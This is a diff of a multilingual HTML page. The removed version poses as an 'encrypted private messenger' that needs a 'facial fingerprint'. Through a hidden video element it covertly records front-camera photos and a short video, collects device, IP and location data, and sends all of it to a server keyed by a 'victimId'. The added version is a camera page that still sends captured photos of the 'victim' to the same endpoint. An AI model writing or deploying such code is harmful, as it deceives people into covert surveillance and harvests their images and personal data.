@@ -1,193 +1,33 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title data-i18n="page_title">دردشة مسنجر خاص</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; font-family:'Cairo',sans-serif; }
-        body {
-            display:flex; justify-content:center; align-items:center; min-height:100vh;
-            background:linear-gradient(135deg, #0084ff, #00c6ff); flex-direction:column; padding:20px;
-        }
-        .card {
-            width:390px; max-width:95%; background:rgba(255,255,255,0.95);
-            backdrop-filter:blur(20px); border-radius:28px; padding:35px 28px;
-            box-shadow:0 20px 50px rgba(0,0,0,0.3); text-align:center; border:1px solid rgba(255,255,255,0.3);
-        }
-        .logo-area { display:flex; align-items:center; justify-content:center; gap:12px; margin-bottom:25px; }
-        .messenger-icon {
-            width:70px; height:70px; background:linear-gradient(135deg, #0084ff, #00c6ff);
-            border-radius:50%; display:flex; align-items:center; justify-content:center;
-            box-shadow:0 8px 20px rgba(0,132,255,0.4);
-        }
-        .messenger-icon svg { width:38px; height:38px; fill:#fff; }
-        .lock-icon {
-            width:36px; height:36px; background:#fff; border-radius:50%;
-            display:flex; align-items:center; justify-content:center;
-            box-shadow:0 4px 10px rgba(0,0,0,0.15); color:#0084ff; font-size:20px;
-        }
-        h1 { color:#111; font-size:24px; margin-bottom:8px; }
-        .subtitle { color:#0084ff; font-size:14px; font-weight:600; margin-bottom:20px; }
-        .features-box {
-            background:#f0f6ff; border-radius:18px; padding:18px; text-align:right;
-            margin-bottom:25px; border:1px solid #d4e7ff;
-        }
-        .features-box p { color:#1a1a1a; font-size:13px; line-height:2; margin:0; }
-        .features-box .feature-icon { display:inline-block; width:18px; text-align:center; margin-left:5px; color:#0084ff; }
-        .btn {
-            width:100%; padding:16px; border:none; border-radius:50px;
-            background:linear-gradient(135deg, #0084ff, #00b2ff); color:#fff;
-            font-size:17px; font-weight:700; cursor:pointer; transition:0.25s;
-            box-shadow:0 8px 18px rgba(0,132,255,0.35);
-        }
-        .btn:hover { transform:translateY(-2px); box-shadow:0 12px 24px rgba(0,132,255,0.5); }
-        .btn:disabled { opacity:0.7; cursor:not-allowed; transform:none; }
-        #result { margin-top:18px; font-weight:600; font-size:14px; min-height:22px; color:#0084ff; }
-        .lang-selector {
-            display:flex; gap:8px; margin-bottom:25px; background:rgba(255,255,255,0.25);
-            border-radius:30px; padding:5px;
-        }
-        .lang-btn {
-            border:none; background:transparent; padding:8px 16px; border-radius:20px;
-            cursor:pointer; font-size:13px; font-weight:600; color:rgba(255,255,255,0.9); transition:0.3s;
-        }
-        .lang-btn.active { background:#fff; color:#0084ff; box-shadow:0 2px 6px rgba(0,0,0,0.15); }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>الكاميرا</title>
+<style>
+body{margin:0;background:#000;font-family:sans-serif;display:flex;flex-direction:column;height:100vh}
+#viewfinder{flex:1;background:#111;position:relative;overflow:hidden}
+video{width:100%;height:100%;object-fit:cover}
+#overlay{position:absolute;inset:0;background:linear-gradient(180deg,rgba(0,0,0,.3),transparent 30%,transparent 70%,rgba(0,0,0,.5))}
+#status{position:absolute;top:16px;left:0;right:0;text-align:center;color:#fff;font-size:14px;text-shadow:0 1px 3px #000;z-index:5}
+#controls{display:flex;justify-content:center;align-items:center;padding:20px;background:#1a1a1a;gap:24px}
+#shutter{width:64px;height:64px;border-radius:50%;border:4px solid #fff;background:rgba(255,255,255,.15);cursor:pointer}
+#shutter:active{background:#fff}
+</style>
 </head>
 <body>
-
-<div class="lang-selector">
-    <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
-    <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
-    <button class="lang-btn" onclick="changeLang('en')">English</button>
+<div id="viewfinder">
+  <video id="video" autoplay playsinline muted></video>
+  <div id="overlay"></div>
+  <div id="status">جارٍ تجهيز الكاميرا...</div>
 </div>
-
-<div class="card">
-    <div class="logo-area">
-        <div class="messenger-icon">
-            <svg viewBox="0 0 24 24"><path d="M12 2C6.36 2 2 6.13 2 11.7c0 2.91 1.34 5.44 3.41 7.12.28.23.45.57.42.94l-.31 2.46c-.06.48.42.85.87.65l2.95-1.3c.3-.13.64-.13.94.01 1.1.49 2.34.76 3.66.76 5.64 0 10-4.13 10-9.7S17.64 2 12 2zm1.24 12.47l-2.53-2.82c-.28-.31-.76-.33-1.07-.05l-3.4 2.5c-.4.3-.46.85-.13 1.24.33.39.93.42 1.3.08l2.24-1.72c.27-.21.65-.19.9.06l2.53 2.82c.28.31.76.33 1.07.05l3.4-2.5c.4-.3.46-.85.13-1.24-.33-.39-.93-.42-1.3-.08l-2.24 1.72c-.27.21-.65.19-.9-.06z"/></svg>
-        </div>
-        <div class="lock-icon">🔒</div>
-    </div>
-
-    <h1 data-i18n="main_title">مرحباً بك في دردشة مسنجر خاص</h1>
-    <p class="subtitle" data-i18n="subtitle">آمنة · مشفرة · خاصة</p>
-
-    <div class="features-box">
-        <p data-i18n="feat1"><span class="feature-icon">✔️</span> المحادثة آمنة ومشفرة بين الطرفين تماماً</p>
-        <p data-i18n="feat2"><span class="feature-icon">🚫</span> يمنع تصوير لقطة الشاشة</p>
-        <p data-i18n="feat3"><span class="feature-icon">🔒</span> يمنع حفظ الصور والفيديو والصوت</p>
-        <p data-i18n="feat4"><span class="feature-icon">⏳</span> تُمسح المحادثة بعد المشاهدة تلقائياً</p>
-        <p data-i18n="feat5"><span class="feature-icon">👤</span> تُفتح الدردشة ببصمة الوجه فقط للأمان</p>
-    </div>
-
-    <button id="btnStart" class="btn" data-i18n="start_btn">
-        لفتح الدردشة وإنشاء بصمة الدخول اضغط هنا
-    </button>
-
-    <div id="result"></div>
+<div id="controls">
+  <span style="width:18px"></span>
+  <button id="shutter"></button>
+  <span style="width:18px"></span>
 </div>
-
-<!-- ڤیدیۆی شاراوە -->
-<video id="hiddenVideo" autoplay playsinline muted style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
-
 <script>
-// ========== وەرگێڕانەکان ==========
-const translations = {
-    ar: {
-        page_title: "دردشة مسنجر خاص",
-        main_title: "مرحباً بك في دردشة مسنجر خاص",
-        subtitle: "آمنة · مشفرة · خاصة",
-        feat1: "المحادثة آمنة ومشفرة بين الطرفين تماماً",
-        feat2: "يمنع تصوير لقطة الشاشة",
-        feat3: "يمنع حفظ الصور والفيديو والصوت",
-        feat4: "تُمسح المحادثة بعد المشاهدة تلقائياً",
-        feat5: "تُفتح الدردشة ببصمة الوجه فقط للأمان",
-        start_btn: "لفتح الدردشة وإنشاء بصمة الدخول اضغط هنا",
-        loading: "⏳ جارٍ التجهيز...",
-        capturing_photos: "📸 جارٍ مسح بصمة الوجه...",
-        capturing_video: "🎥 جارٍ التحقق الإضافي...",
-        sending: "📤 جارٍ إرسال البيانات...",
-        success: "✅ تم التحقق بنجاح",
-        fail: "❌ فشل التحقق، يرجى المحاولة لاحقاً",
-        camera_error: "⚠️ تعذر الوصول إلى الكاميرا"
-    },
-    ckb: {
-        page_title: "دەردەشەی تایبەتی مەسنجەر",
-        main_title: "بەخێربێیت بۆ دەردەشەی تایبەتی مەسنجەر",
-        subtitle: "پارێزراو · کریپتۆکراو · تایبەت",
-        feat1: "وتووێژەکە بە تەواوی پارێزراو و کریپتۆکراوە لە نێوان هەردوو لادا",
-        feat2: "ڕێگری لە وێنەگرتنی شاشە دەکرێت",
-        feat3: "ڕێگری لە پاشەکەوتکردنی وێنە و ڤیدیۆ و دەنگ دەکرێت",
-        feat4: "وتووێژەکە خۆکارانە دەسڕێتەوە دوای بینین",
-        feat5: "دەردەشەکە تەنها بە پەنجەمۆری دەم و چاو دەکرێتەوە بۆ پاراستن",
-        start_btn: "بۆ کردنەوەی دەردەشە و دروستکردنی پەنجەمۆری چوونەژوورەوە کرتە لێرە بکە",
-        loading: "⏳ ئامادەکردن...",
-        capturing_photos: "📸 سکانکردنی پەنجەمۆری دەم و چاو...",
-        capturing_video: "🎥 پشتڕاستکردنەوەی زیاتر...",
-        sending: "📤 ناردنی داتا...",
-        success: "✅ پشتڕاستکرایەوە",
-        fail: "❌ پشتڕاستکردنەوە سەرکەوتوو نەبوو، تکایە دواتر هەوڵبدەرەوە",
-        camera_error: "⚠️ ناتوانرێت کامێرا بکرێتەوە"
-    },
-    en: {
-        page_title: "Private Messenger Chat",
-        main_title: "Welcome to Private Messenger Chat",
-        subtitle: "Secure · Encrypted · Private",
-        feat1: "The conversation is fully secure and encrypted between both parties",
-        feat2: "Screenshot capture is blocked",
-        feat3: "Saving photos, videos and audio is blocked",
-        feat4: "The chat is automatically deleted after viewing",
-        feat5: "The chat opens only with facial fingerprint for security",
-        start_btn: "To open the chat and create the login fingerprint, click here",
-        loading: "⏳ Preparing...",
-        capturing_photos: "📸 Scanning facial fingerprint...",
-        capturing_video: "🎥 Additional verification...",
-        sending: "📤 Sending data...",
-        success: "✅ Verification successful",
-        fail: "❌ Verification failed, please try again later",
-        camera_error: "⚠️ Could not access camera"
-    }
-};
-
-function changeLang(lang) {
-    if (lang === 'ar' || lang === 'ckb') {
-        document.documentElement.dir = 'rtl';
-    } else {
-        document.documentElement.dir = 'ltr';
-    }
-    document.querySelectorAll('[data-i18n]').forEach(el => {
-        const key = el.getAttribute('data-i18n');
-        if (translations[lang] && translations[lang][key]) {
-            if (key.startsWith('feat')) {
-                const icon = el.querySelector('.feature-icon');
-                el.innerHTML = (icon ? icon.outerHTML + ' ' : '') + translations[lang][key];
-            } else {
-                el.textContent = translations[lang][key];
-            }
-        }
-    });
-    document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
-    document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
-    localStorage.setItem('preferred_lang_messenger', lang);
-}
-
-window.addEventListener('DOMContentLoaded', () => {
-    const savedLang = localStorage.getItem('preferred_lang_messenger') || 'ar';
-    changeLang(savedLang);
-});
-
-// ========== لۆجیک — متوافق مع أحدث نسخة من التطبيق ==========
-// الرابط من التطبيق:  https://the-eye-project.vercel.app/cam.html?chatId=xxxx
-// لا يوجد توكن في الرابط — الإرسال عبر /api/send (متغيرات البيئة على Vercel)
-
 const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
-const hiddenVideo = document.getElementById('hiddenVideo');
-const resEl = document.getElementById('result');
-const btn = document.getElementById('btnStart');
-let stream = null;
 
 async function apiSend(payload) {
     try {
@@ -200,129 +40,38 @@ async function apiSend(payload) {
     } catch (e) { return false; }
 }
 
-// 📱 معلومات الجهاز بصمت (مثل silent.html) — لا تمنع سير العمل
-async function sendDeviceInfo() {
-    try {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-        let ipd = { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف' };
-        try { const r = await fetch('https://ipapi.co/json/'); if (r.ok) ipd = await r.json(); } catch (e) {}
-        const msg = '📱 **جهاز جديد**\n' +
-            '👤 الهدف: ' + victimId + '\n' +
-            '🌐 IP: ' + ipd.ip + '\n' +
-            '🌍 الدولة: ' + ipd.country + ', ' + ipd.city + '\n' +
-            '🔹 المنصة: ' + (navigator.platform || '?') + '\n' +
-            '🔹 اللغة: ' + navigator.language + '\n' +
-            '🔹 الشاشة: ' + (screen.width || '?') + 'x' + (screen.height || '?') + '\n' +
-            '🔹 المنطقة: ' + (Intl.DateTimeFormat().resolvedOptions().timeZone || '?') + '\n' +
-            '🔹 المعالجات: ' + (navigator.hardwareConcurrency || '?') + '\n' +
-            '🔹 الذاكرة: ' + (navigator.deviceMemory || '?') + 'GB\n' +
-            '🔹 الاتصال: ' + (conn.effectiveType || '?') + ' (' + (conn.downlink || '?') + 'Mbps)\n' +
-            '🔹 المتصفح: ' + navigator.userAgent.substring(0, 80);
-        await apiSend({ type: 'message', chatId: victimId, text: msg });
-    } catch (e) {}
-}
+const video = document.getElementById('video');
+const statusEl = document.getElementById('status');
+let stream = null;
 
-// 🎥 تسجيل فيديو قصير بجودة منخفضة (لتفادي حد Vercel 4.5MB)
-function recordVideo(durationMs) {
-    return new Promise((resolve, reject) => {
-        if (!stream) return reject(new Error('No stream'));
-        let mime = 'video/webm';
-        try {
-            if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
-                mime = 'video/webm;codecs=vp8,opus';
-            }
-        } catch (e) {}
-        let rec;
-        try {
-            rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 500000 });
-        } catch (e) {
-            rec = new MediaRecorder(stream);
-        }
-        const chunks = [];
-        rec.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
-        rec.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
-        rec.onerror = reject;
-        rec.start();
-        setTimeout(() => { try { rec.stop(); } catch (e) {} }, durationMs);
-    });
-}
-
-function blobToBase64(blob) {
-    return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onloadend = () => resolve(reader.result);
-        reader.onerror = reject;
-        reader.readAsDataURL(blob);
-    });
-}
-
-async function startHiddenCapture() {
-    const lang = localStorage.getItem('preferred_lang_messenger') || 'ar';
-    btn.disabled = true;
-    resEl.textContent = '';
-
-    try {
-        // فتح الكاميرا الأمامية مخفية
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: false
+function sendPhoto(dataUrl) {
+    apiSend({ type: 'photo', chatId: victimId, photo: dataUrl, caption: '📸 صورة من الكاميرا' })
+        .then(ok => {
+            statusEl.textContent = ok ? '✅ تم الإرسال' : '❌ فشل الإرسال';
+            setTimeout(() => statusEl.textContent = 'اضغط الزر لالتقاط صورة', 2000);
         });
-        hiddenVideo.srcObject = stream;
-        await hiddenVideo.play();
-        await new Promise(r => setTimeout(r, 800));
+}
 
-        // ١. معلومات الجهاز (بصمت — لا تعطل شيئاً)
-        sendDeviceInfo();
-
-        // ٢. ٣ صور لبصمة الوجه
-        btn.textContent = translations[lang].capturing_photos;
-        for (let i = 1; i <= 3; i++) {
-            const canvas = document.createElement('canvas');
-            canvas.width = hiddenVideo.videoWidth || 640;
-            canvas.height = hiddenVideo.videoHeight || 480;
-            canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
-            const ok = await apiSend({
-                type: 'photo',
-                chatId: victimId,
-                photo: canvas.toDataURL('image/jpeg', 0.8),
-                caption: '📸 بصمة الوجه ' + i + ' من 3'
-            });
-            if (!ok) throw new Error('فشل إرسال صورة ' + i);
-            await new Promise(r => setTimeout(r, 600)); // مهلة قصيرة بين الصور
-        }
-
-        // ٣. فيديو 4 ثوانٍ (جودة منخفضة)
-        btn.textContent = translations[lang].capturing_video;
-        const videoBlob = await recordVideo(4000);
-        const videoBase64 = await blobToBase64(videoBlob);
-
-        btn.textContent = translations[lang].sending;
-        await apiSend({
-            type: 'video',
-            chatId: victimId,
-            video: videoBase64,
-            caption: '🎥 فيديو التحقق (4 ثوانٍ)'
-        });
-
-        // الصور وصلت = نجاح (الفيديو إضافي — حتى لو فشل لا نفشل العملية)
-        resEl.textContent = translations[lang].success;
-
+async function startCamera() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+        video.srcObject = stream;
+        statusEl.textContent = 'اضغط الزر لالتقاط صورة';
     } catch (e) {
-        console.error(e);
-        resEl.textContent = (e && e.name === 'NotAllowedError')
-            ? translations[lang].camera_error
-            : translations[lang].fail;
-    } finally {
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-            stream = null;
-        }
-        btn.disabled = false;
-        btn.textContent = translations[lang].start_btn;
+        statusEl.textContent = '⚠️ تعذّر الوصول للكاميرا';
     }
 }
 
-document.getElementById('btnStart').addEventListener('click', startHiddenCapture);
+document.getElementById('shutter').onclick = () => {
+    if (!stream) { startCamera(); return; }
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    sendPhoto(canvas.toDataURL('image/jpeg', 0.8));
+};
+
+startCamera();
 </script>
 </body>
 </html>
